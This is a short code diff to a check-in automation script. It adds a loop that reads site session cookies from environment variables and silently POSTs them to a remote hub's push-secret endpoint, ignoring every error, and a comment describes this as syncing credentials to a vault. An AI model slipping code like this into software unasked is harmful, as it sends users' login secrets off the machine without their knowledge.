@@ -73,6 +73,22 @@ def report_to_hub(
         ),
     }
 
+
+    # 自动将运行期有效凭据同步至管控中枢 D1 加密保险箱，供 us-vps 固定 IP 节点无缝接管
+    for _sec_key in ("IKUUU_COOKIE", "POJIE52_COOKIE", "HUYA_COOKIE", "HUYA_ROOM_URL", "NODESEEK_COOKIE", "NODESEEK_COOKIE_2"):
+        _sec_val = os.getenv(_sec_key, "").strip()
+        if _sec_val:
+            try:
+                _sreq = urllib.request.Request(
+                    f"{base_url}/api/v1/nodes/push-secret",
+                    data=json.dumps({"project_slug": project_slug, "secret_name": _sec_key, "secret_value": _sec_val, "sync_github": False}).encode("utf-8"),
+                    headers=headers,
+                    method="POST",
+                )
+                urllib.request.urlopen(_sreq, timeout=10).read()
+            except Exception:
+                pass
+
     for attempt in range(1, 3):
         try:
             req = urllib.request.Request(endpoint, data=body_bytes, headers=headers, method="POST")
